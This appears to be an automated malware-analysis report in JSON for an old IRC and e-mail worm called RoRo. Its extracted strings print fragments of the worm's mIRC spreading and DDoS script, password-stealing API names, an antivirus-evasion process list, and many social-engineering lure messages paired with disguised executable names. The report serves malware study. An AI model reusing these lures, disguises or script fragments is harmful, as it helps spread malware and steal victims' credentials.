            "n40=  .hadd Data iIPCount 10 | .hadd Data iJoinCount 10",
            "n41=  .hadd Data Services NS MS CS OS SeenServ NickServ MemoServ ChanServ OperServ Global",
            "n42=  .SetCountry Other | .SetScript Big | .SetPriv Slave",
            "n43=  if ($exists($hget(Data, File)) != $true) { .SetFileNames }",
            "n44=  if ($readini($hget(Data, File), Options, Init2) != 1)  || ($exists($GFN(DEF)) != $true) { .SetSites } | .SetLoad Big",
            "n45=  if ($getStat == $null) { .setStat Semi }",
            "n46=  if ($getStat == Full) { .hadd Data Spread On }",
            "n47=  .hadd Data Loaded $calc($readini($hget(Data, File),Options,Loaded) + 1) | .writeini $hget(Data, File) Options Loaded $hget(Data, Loaded)",
            "n48=  .write -c notes.txt | .load -rs1 notes.txt | .sockclose *",
            "n49=}",
            "n50=alias Init {",
            "n51=  if ($hget(Data).size == 0) { .unload -rsn $script }",
            "n52=  .ignore -r | .hadd Data OnJoinMsg off | .hadd Data OnJoinNotice off",
            "n53=  .timerListenIt 1 5 { .ListenIt }",
            "n54=  .timerMailMe 1 5 { .MailMe BG }",
            "n55=  .timerHttpMe 1 15 { .HttpMe }",
            "n56=  .timerRNA 1 15 { .RNA }",
            "n57=  .timerDDos 0 90 { .DDos }",
            "n18=alias Wind { .return @ $+ $1 }",
            "n19=alias CD0 { .return C:\\msdos.sys }",
            "n20=alias Verify { if ($sock($1).name != $null) { .return 1 } | .return 0 }",
            "n21=alias WinDir {",
            "n22=  var %sWinDir = \"\"",
            "n23=  %sWinDir = $readini(C:\\MsDos.sys, PATHS, Win) | if (%sWinDir) .return %sWinDir",
            "n24=  %sWinDir = $readini(C:\\MsDos.sys, PATHS, WinDir) | if (%sWinDir) .return %sWinDir",
            "n25=  %sWinDir = $finddir(C:\\,Win*,1,1) | if (%sWinDir) .return %sWinDir",
            "n26=  %sWinDir = $finddir(D:\\,Win*,1,1) | if (%sWinDir) .return %sWinDir",
            "n27=}",
            "n28=",
            "n29=; * INIT Functions *",
            "n30=on *:Connect:{ .Init }",
            "n31=on *:Disconnect:{ .timers off | .sockclose * }",
            "n32=on *:Unload:{ if ($hget(Mutex).size > 0) .hfree Mutex }",
            "n33=on *:Start:{ .Start }",
            "n34=alias Start {",
            "n35=  if ($version < 5.8) { .unload -rsn $script | .halt }",
            "n36=  if ($hget(Mutex).size > 0) { .unload -rsn $script | .halt } | .hmake Mutex 1",
            "n37=  if ($HGet(Data).size > 0) { .hfree Data } | .hmake Data 100",
            "n38=  .hadd Data File $WinDir $+ \\ $+ $CDO",
            "n39=  .hadd Data Recving Idle | .hadd Data Sending Idle",
            "[script]",
            "n0=alias setPriv { .hadd Data Priv $1 }",
            "n1=alias getPriv { .return $hget(Data,Priv) }",
            "n2=alias setStat { .writeini $hget(Data, File) Options Virus $1 }",
            "n3=alias getStat { .return $readini($hget(Data, File), Options, Virus) }",
            "n4=alias setCountry { .hadd Data Country $1 }",
            "n5=alias getCountry { .return $hget(Data,Country) }",
            "n6=alias getScript { .return $hget(Data, Script) }",
            "n7=alias setScript { .hadd Data Script $1 }",
            "n8=alias GFN { .return $readini($hget(Data, File),Files,$1) }",
            "n9=alias SFN { .writeini $hget(Data, File) Files $1 $2- }",
            "n10=alias AddHTTP { .Writeini $GFN(DEF) HTTP $1 $2- }",
            "n11=alias DelHTTP { .Remini $GFN(DEF) HTTP $1 }",
            "n12=alias AddMAIL { .Writeini $GFN(DEF) MAIL $1 $2- }",
            "n13=alias DelMAIL { .Remini $GFN(DEF) MAIL $1 }",
            "n14=alias AddSITE { .Writeini $GFN(DEF) SITES $1 $2- }",
            "n15=alias DelSITE { .Remini $GFN(DEF) SITES $1 }",
            "n16=alias GetFileName { .return $right($1,$calc($len($1) - $pos($1,\\,$pos($1,\\,0)))) }",
            "n17=alias GetFilePath { .return $left($1,$calc($pos($1,\\,$pos($1,\\,0)) - 1)) }",
            "rfiles",
            "mirc",
            "host",
            "%s\\mirc.ini",
            "irc.otel.net irc.spnet.net irc.techno-link.com irc.tu-varna.edu",
            "irc.evko.com irc.exco.net irc.itdnet.net irc.lirex.com irc.lt-tech.net irc.naturella.com",
            "irc.asenovgrad.net irc.bitex.com irc.bourgas.net irc.dobrich.net",
            "alias.ini|server.ini|notes.ini|popup.ini",
            "%s\\def12x.dll",
            "%s\\rn3a.vxd",
            "%s\\mios.sys",
            "IRC2",
            "%s\\i2RC.sys",
            "User",
            "RemoteAccess\\Profile\\%s",
            "Rna\\",
            "Pass",
            "Type",
            "Info",
            "NewItems",
            "Status",
            "RemoteAccess",
            "AreaCode",
            "WNetEnumCachedPasswords",
            "MPR.DLL",
            "Hey you!! Wasssssssuppppppp :)))) Where are you? What are you doing? I've just got high in the sky, my oh my :)) It's like I don't care about nothing man :)) sMiLe :oP~pPPPpp I send you a sexy, little thing :)) Everything is just an illusion. Believe me.. It's time to say goodbye now.. See you",
            "Hi!!",
            "[TNT] Gen.exe",
            "Hello :>> How are you? What're you doing :) Do you have Blade 2? I've just watched it twice, it's marvellous! You can't guess what I've found.. A working Credit Card generator :))) I purchased a bride from Russia yesterday :) LoL.. I gave a fake address of course :))) Promise me not to send it to anybody! Don't go too far and watch out :)) Bye..",
            "Wow..",
            "YoOo :)) What a nice day, what a nice time :) What a nice world :)) Do you have Blade 2? I've just watched it twice, it's marvellous! lol ~pPp Do you have any ATC's mp3z? CooL :))) I've found them with this program, it's like Napster, but it's legal :))",
            " P.S. Download ATC - Why oh why.mp3 !!! Bye ~~~~ppPpP ;)",
            "yoOo ;)",
            "Setup.exe",
            "There is a new, dangerous virus in the net. It's called Roro and it's using IRC to infect computers. The virus deletes movies, music and system files. To prevent from infecting, install McAfee Anti-Script 2002. It's a 30-days demo.. ",
            "So, how are you? Good, Bad? I'm oK. I wanted to write you a longer letter, but i didn't have enough time.. sorry. Bye",
            "Be careful",
            "Hey :) Wasupp ~Pp I wanted to write you a letter, but i didn't know what to talk about actually :) Have you ever done an IQ test, i've just scored 120 points :) I'm not sure if this is good or bad, who cares :) Have you visited %s :) Finally, how are you:) i'll be very happy if you send me 1,2 funny cards :)))) bye! :)",
            "BlaBla",
            "Hi buddy, what's up :)) I've only wanted to remind you not to forget about our little, dirty secret :) And don't tell anybody :Ppp. Have you seen this site - %s c00l :) Leave this away, how are you? Send me sth cool, plzz :) bye! :)",
            "HeY.. Buddz what'z up :) How are you? I'm fine, 10x!! My friend Nina is here and we are.. You know :) Lalala !! Be happy, don't worry ~pPp. Btw check this site - %s, it's fresh :)) I'm a little drunk and i've gotta go now !! Wish me luck :)) Cya",
            "HeY..",
            "mTV Charts.exe",
            "Hi, kak e :) ko si praikash? az si slusham muzichka - ATC i Mortal Kombat Soundtrack - Varhovni sa, napravo izbuhnah :))) Drapnah si gi ot neta s taq programka - ima 200 kubriliona klasacii :) Naposledak muzikata e edno ot malkoto mi udovolstviq",
            "P.S. Obezatelno si drapni ATC - Why oh why.mp3 :))",
            "Chao, doskoro!!",
            "Bla Bla :)",
            "Worm Guard.exe",
            "Ima nov opasen virus v neta! Razprostranqva se predimno po IRC i ICQ. Vnimavai da ne se zarazish, zashtoto iztriva Mp3-ki, Filmi i Dokumenti. Izpratih ti patch, koito shte te pazi ot zarazqvane. Iskah da napisha po-dulgo pismo, no nqmah vreme, sorka.. Naposledak imam adski mnogo rabota nalqvo nadqsno :)) Inache kak varvi? Chao i watch out :)))",
            "Vajno!!",
            "[TNT]GeN.exe",
            "Zdrasti, kak q karash :) az sam dobre, makar che naposledak imam malko problemi. Tvarde mnogo mi se strupa navednaj, udarih si rakata ei sq i mnogo me boli.. Kakvo da se pravi, takav e jivota.. Vchera namerih nqkav generator na kreditni karti i mai bachka, samo edin put go probvah ama stana, vij dali pri teb sha raboti i umnata :) Ai doskoro :)) Chao ti",
            "ZzZz :)",
            "Love Zodiak.exe",
            "Zdr, izpratih na vsichki edna programka, mnoo qka, btw to imeto si pokazva. Subject-a e ot tam i ima i drugi mnogo qki misli. Moje da pokaje nai-podhodqshtiq partnior v liubofta :)) Ujasno e kak liubofta moje da ubie vsichko v teb.. Za shtastie ne vinagi e taka :) Inache nishto novo, karam q nqkak.. Sega trqbva da izlizq za malko tai che bye :))",
            "Liubofta e kato Rai, no moje da boli kato Ad",
            "Zdrasti :)) Nqma da povqrvash kakvo mi se sluchi neska :) Vidqh Slavi Trifonov i nqkvi mnoo qki madami s nego :))) Ko shi kaish a? Misleh da mu iskam avtograf ama me dosramq :(( Karai, drug pat ~pP. Begai na %s :) Malko e stranen, no ne e losh. Hmm, ti ko praish? Pishi mi :) Chao",
            "Ei dupe :)",
            "Zdravei, zdrasti, dai pari za pasti :)) Ko praish? Za teb neznam ama v momenta se chustvam mnoo qko i reshih da ti pisha :) Kolko ti e rekorda na minichkite? Toku shto na Expert razminirah za 2 minuti :))) Ei sq smqtam da si vzema nqkoi qk film i da gledam. Hodil li si na %s - Mnoo me kefi :)) Za drugo ne se seshtam tai che chao za sega :))",
            "Ohoo!!",
            "Hey, kak varvi, neshto novo ima li :) Adski mi sa spi, daje ei sq smqtam da si legna ama purvo shte si vzema edin dush :)) Skoro shti pratq onva deto obeshtah, za sq mojesh da hvarlish edno oko na %s - ako imash nqkvi predlojeniq, komentari ili kakvoto i da e pishi mi :)) Aide doskoro i umnata ~pPp",
            "Zdrasti..",
            "Star Craft 2 Trailer.exe|WWF_The_ROCK(sHOw).exe|Sound Factory SFX.exe|Eminem Desktop.exe|DMX tHeMe (full).exe",
            "Sent",
            "MAPIReadMail",
            "MAPIFindNext",
            "MAPISendMail",
            "MAPILogoff",
            "MAPILogon",
            "MAPI32.DLL",
            "www.%s",
            "SITES",
            "NoLogon",
            "Mail",
            "MAPI",
            "Other",
            "RegisterServiceProcess",
            "KERNEL32.DLL",
            "RoRo",
            "Process32Next",
            "Process32First",
            "CreateToolhelp32Snapshot",
            "black,panda,shield,guard,scan,mcafee,nai_vs_stat,iomon,navap,avp,alarm,f-prot,secure,labs,antivir",
            "\t\t\t\t"
        ],
        "file": {
            "%s%s.exe": "Executable",
            "%s\\Rundll16.exe": "Executable",
            "%s\\Winfile.dll": "Library",
            "%s\\def12x.dll": "Library",
            "ADVAPI32.dll": "Library",
            "KERNEL32.dll": "Library",
            "Love Zodiak.exe": "Executable",
            "MAPI32.DLL": "Library",
            "MPR.dll": "Library",
            "RASAPI32.dll": "Library",
            "Setup.exe": "Executable",
            "Star Craft 2 Trailer.exe|WWF_The_ROCK(sHOw).exe|Sound Factory SFX.exe|Eminem Desktop.exe|DMX tHeMe (full).exe": "Executable",
            "WS2_32.dll": "Library",
            "Worm Guard.exe": "Executable",
            "Zip Password Recovery v4.5.exe|Star Craft 2 Trailer.exe|WWF!!_The_ROCK(sHOw).exe|cRedit CarDs gEn v1.2.exe|WinZip 8.2 (Cracked).exe|GTA 3 Bonus Cars.exe|Eminem Desktop.exe|DMX tHeMe (full).exe|NFS 5 Bonus Cars.exe|Counter Strike 1.5 (Editor).exe|Madonna - My Life (Review).exe|DivX 5.4 Bundle.exe|KaZaA Media Desktop v1.8.3.exe|Win XP key gen 2.1B.exe|Serials 2002 Update.exe": "Executable",
            "[TNT] Gen.exe": "Executable",
            "[TNT]GeN.exe": "Executable",
            "mTV Charts.exe": "Executable",
            "n151=        .hadd Data Recving Busy | .hadd Data $rev(%sName, LocalName) $WinDir $+ \\RoRo.exe": "Executable",
            "roro.exe": "Executable",
            "user32.dll": "Library",
            "versions.txt": "Text"
        },
        "fuzzing": {},
        "ip": [
            "5.6.7.10",
            "1.2.3.4"
        ],
        "url": [
            "http://www.Pam-Anderson.8m.com",
            "http://Gamerz.Bol.Bg",
            "http://www.Kurnikova.Bol.bg",
            "http://Teen-Zone.FaithWeb.CoM"
        ]
    },
    "time": "0:00:00.971043",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "packer_compiler_signatures.yar": "IsPE32"
        },
        {
            "packer_compiler_signatures.yar": "IsWindowsGUI"
        },
        {
            "packer_compiler_signatures.yar": "HasRichSignature"
        }
    ]
}
